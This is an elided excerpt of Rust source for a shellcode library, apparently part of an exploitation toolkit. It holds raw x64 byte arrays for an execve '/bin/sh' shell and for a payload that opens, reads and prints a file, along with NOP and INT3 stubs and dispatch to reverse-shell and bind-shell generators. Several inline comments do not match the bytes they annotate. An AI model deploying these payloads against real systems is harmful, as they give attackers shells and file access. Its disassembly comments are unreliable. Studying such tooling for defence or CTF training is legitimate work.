...
impl ShellcodeLibrary {
    ...
    fn init_x64_shellcodes(&mut self) {
        self.shellcodes.insert(
            ...
            vec![
                ...
                0x6e, 0x2f, 0x73, 0x68, 0x00, 0x57, // push rdi
                0x54, // push rsp
                0x5f, // pop rdi
                0x6a, 0x3b, // push 0x3b
                0x58, // pop rax
        ...
        self.shellcodes
            .insert((Architecture::X64, Payload::Nop), vec![0x90]);

        self.shellcodes
            .insert((Architecture::X64, Payload::Int3), vec![0xcc]);
        ...
        self.shellcodes.insert(
            ...
            vec![
                ...
                0x67, 0x2e, 0x74, 0x78, 0x74, 0x50, // push rax
                0x48, 0x89, 0xe7, // mov rdi, rsp
                0x48, 0xc7, 0xc0, 0x02, 0x00, // mov rax, 2 (sys_open)
                0x00, 0x00, 0x0f, 0x05, // syscall
                0x48, 0x89, 0xc7, // mov rdi, rax
                0x48, 0x31, 0xc0, // xor rax, rax
                0x48, 0x89, 0xe6, // mov rsi, rsp
                0x48, 0xc7, 0xc2, 0x00, 0x01, // mov rdx, 256
                0x00, 0x00, 0x0f, 0x05, // syscall (sys_read)
                0x48, 0xc7, 0xc0, 0x01, 0x00, // mov rax, 1 (sys_write)
                0x00, 0x00, 0x48, 0xc7, 0xc7, 0x01, 0x00, // mov rdi, 1 (stdout)
                0x00, 0x00, 0x0f, 0x05, // syscall
            ],
        );
    }
    ...
    fn init_x86_shellcodes(&mut self) {
        ...
        self.shellcodes
            .insert((Architecture::X86, Payload::Nop), vec![0x90]);

        self.shellcodes
            .insert((Architecture::X86, Payload::Int3), vec![0xcc]);
    }
    ...
    pub fn get_with_params(
        ...
        match payload {
            Payload::ShellReverseTcp => self.generate_reverse_shell(arch, params),
            Payload::ShellBindTcp => self.generate_bind_shell(arch, params),
            _ => self
                .get(arch, payload)
